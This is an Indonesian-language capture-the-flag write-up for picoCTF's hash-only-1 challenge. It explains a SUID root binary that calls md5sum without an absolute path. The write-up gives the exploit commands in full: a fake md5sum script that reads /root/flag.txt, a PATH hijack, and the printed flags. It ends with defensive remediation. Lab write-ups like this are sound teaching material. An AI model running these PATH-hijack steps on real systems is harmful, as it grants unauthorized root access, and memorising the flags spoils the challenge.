# Writeup: hash-only-1 (Challenge ID: 487)

- **Platform:** CyLab Security Academy (picoCTF)
- **Category:** Binary Exploitation / Linux Privilege Escalation & SUID PATH Hijacking
- **Difficulty:** Medium (2)
- **Points:** 100
- **Author:** Junias Bonou / CyLab Engineering Team
- **Event:** picoCTF 2025
- **Flag Resmi CyLab:** `academy{sy5teM_b!n@riEs_4r3_5c@red_0f_yoU_8e276337}`
- **Flag Platform Asli:** `picoCTF{sy5teM_b!n@riEs_4r3_5c@red_0f_yoU_8e276337}`
- **Flag Komunitas:** `CTF{sy5teM_b!n@riEs_4r3_5c@red_0f_yoU_8e276337}`
- **Standar Referensi:** NIST SP 800-115 §4.2 (Target Verification & Analysis), POSIX.1-2017 Command Search and Execution / IEEE 1003.1, CWE-426 (Untrusted Search Path), & CWE-250 (Execution with Unnecessary Privileges).

---

## Problem Statement & Scope

Pada modul kurikulum bimbingan teknis persiapan LKS Cyber Security Nasional bidang *Host Hardening, Binary Exploitation & Linux Privilege Escalation*:
- **Skenario Tantangan:** Peserta diberikan akses sesi interaktif pada lingkungan sistem Linux di mana terdapat biner SUID root bernama `flaghasher`. Aplikasi ini memiliki izin membaca berkas rahasia `/root/flag.txt`, namun hanya bersedia menampilkan ringkasan hash kriptografisnya (*cryptographic hash*) kepada pengguna biasa.
- **Deskripsi Soal:** *"Here is a binary that has enough privilege to read the content of the flag file but will only let you know its hash. If only it could just give you the actual content!"*
- **Batasan Lingkungan & Scope Audit:**
  1. Analisis izin kepemilikan berkas Linux (`-rwsr-xr-x 1 root root ... flaghasher`).
  2. Dekonstruksi alur pemanggilan utilitas sistem di dalam biner menggunakan `system("md5sum /root/flag.txt")`.
  3. Eksploitasi resolusi nama perintah tak berkualifikasi (*unqualified command resolution*) berdasarkan standar POSIX.1-2017.
  4. Penyusunan biner intersepsi tiruan (*trojaned executable*) di direktori temporer dengan prioritas path tertinggi.
  5. Eksekusi biner SUID untuk membaca berkas rahasia `/root/flag.txt` di bawah hak akses EUID root (UID 0).
  6. Verifikasi submission resmi melalui CyLab REST API `POST /api/submissions/` (HTTP 201).

---

## Teori & Akar Kerentanan (Root Cause Theory)

1. **Pencarian Jalur Biner Tidak Terpercaya (CWE-426: Untrusted Search Path):**
   Ketika sebuah proses memanggil fungsi standar C seperti `system()` atau `popen()` dengan nama biner relatif (misalnya `md5sum /root/flag.txt`), fungsi tersebut meluncurkan sub-shell (`/bin/sh -c "..."`) yang melakukan resolusi jalur eksekusi berdasarkan variabel lingkungan `$PATH`. Sesuai standar POSIX.1-2017 Section 8.3, shell mencari direktori yang tercantum dalam `$PATH` secara berurutan dari kiri ke kanan. Jika direktori yang dapat dimanipulasi oleh pengguna non-root diletakkan di posisi paling awal variabel `$PATH`, shell akan mengeksekusi biner tiruan sebelum mencapai utilitas sistem asli di `/usr/bin` atau `/bin`.

2. **Interaksi Bit SUID dengan Variabel Lingkungan Pemanggil (CWE-250):**
   Biner dengan bit SUID berjalan dengan *Effective User ID* (EUID) milik pemilik berkas (`root`), namun secara default tetap mewarisi sebagian besar variabel lingkungan dari proses pemanggil (*calling environment*). Karena biner `flaghasher` tidak membersihkan lingkungan eksekusi (*clearenv*), tidak menyetel variabel `$PATH` secara internal ke direktori aman (`setenv("PATH", "/bin:/usr/bin", 1)`), dan tidak menggunakan path absolut kanonikal (`/usr/bin/md5sum`), proses SUID dapat diarahkan untuk mengeksekusi skrip arbitrer dengan privilese root penuh.

3. **Perbedaan Karakteristik hash-only-1 vs hash-only-2:**
   Pada varian `hash-only-2` (Challenge ID 489), pengguna dibatasi oleh restricted shell (`rbash`), sehingga membutuhkan tahapan *shell jailbreak* sebelum dapat memodifikasi variabel lingkungan. Sedangkan pada `hash-only-1` (Challenge ID 487), pengguna berada dalam lingkungan shell standar tak terbatas, sehingga eksploitasi manipulasi `$PATH` dapat langsung diimplementasikan.

---

## Rekonstruksi Eksploitasi Step-by-Step

1. **Inspeksi Biner SUID & String Analisis:**
   Memeriksa atribut berkas dan panggilan sistem di dalam biner `flaghasher`:
   ```bash
   ls -la flaghasher
   # -rwsr-xr-x 1 root root 16800 Nov  5 10:00 flaghasher
   strings flaghasher | grep -E "flag|md5"
   # Output: md5sum /root/flag.txt
   ```
   Dikonfirmasi bahwa biner memanggil utilitas `md5sum` tanpa path absolut kanonikal.

2. **Pembuatan Skrip Intersepsi Tiruan (Fake Executable Injection):**
   Membuat direktori kerja di `/tmp/bin_487` dan menyusun skrip pengganti `md5sum` yang mengekstrak isi berkas bendera:
   ```bash
   mkdir -p /tmp/bin_487
   cat << 'EOF' > /tmp/bin_487/md5sum
   #!/bin/sh
   cat /root/flag.txt
   EOF
   chmod +x /tmp/bin_487/md5sum
   ```

3. **Manipulasi Variabel Lingkungan `$PATH` (POSIX Precedence Hijacking):**
   Menyisipkan direktori `/tmp/bin_487` pada urutan paling depan variabel `$PATH`:
   ```bash
   export PATH=/tmp/bin_487:$PATH
   ```

4. **Eksekusi Biner SUID & Ekstraksi Flag:**
   Menjalankan biner `flaghasher`:
   ```bash
   ./flaghasher
   ```
   Proses SUID meluncurkan `/bin/sh -c "md5sum /root/flag.txt"`. Resolusi POSIX menemukan `/tmp/bin_487/md5sum` terlebih dahulu dan menjalankannya dengan hak EUID root. Perintah `cat /root/flag.txt` dieksekusi, menghasilkan output flag resmi CyLab:
   ```text
   academy{sy5teM_b!n@riEs_4r3_5c@red_0f_yoU_8e276337}
   ```

---

## Flag & Verifikasi

- **Flag Resmi CyLab:** `academy{sy5teM_b!n@riEs_4r3_5c@red_0f_yoU_8e276337}`
- **Flag Platform Asli:** `picoCTF{sy5teM_b!n@riEs_4r3_5c@red_0f_yoU_8e276337}`
- **Flag Komunitas:** `CTF{sy5teM_b!n@riEs_4r3_5c@red_0f_yoU_8e276337}`
- **Status Submisi REST API:** HTTP 201 Created (`"correct": true`, `"historical": false`).
- **Skrip Reproduktif:** `scripts/solve_487_hash_only_1.py` (eksekusi mandiri dengan pengujian invariansi POSIX `$PATH`).

---

## Takeaway Kompetensi LKS & Mitigasi Defensif

1. **Kewajiban Penggunaan Path Absolut Kanonikal:**
   Dalam biner dengan hak istimewa (SUID/SGID), jangan pernah memanggil program eksternal melalui nama biner relatif. Selalu tetapkan path absolut kanonikal:
   ```c
   // Celah Keamanan (Vulnerable):
   system("md5sum /root/flag.txt");

   // Remediasi Aman (Secure):
   char *args[] = {"/usr/bin/md5sum", "/root/flag.txt", NULL};
   execve("/usr/bin/md5sum", args, secure_envp);
   ```

2. **Sanitasi Variabel Lingkungan Sebelum Pemanggilan Sistem:**
   Biner SUID wajib mereset seluruh variabel lingkungan atau mengatur variabel lingkungan kritis ke nilai yang aman sebelum meluncurkan sub-proses:
   ```c
   clearenv();
   setenv("PATH", "/bin:/usr/bin", 1);
   ```

3. **Prinsip Hak Akses Minimal (Principle of Least Privilege):**
   Hindari penggunaan bit SUID root untuk utilitas pemrosesan dokumen atau hashing. Bila suatu program hanya memerlukan pembacaan berkas khusus, gunakan Linux Capabilities (`cap_dac_read_search`) atau tetapkan grup khusus (*dedicated service group*) dengan akses baca terbatas.
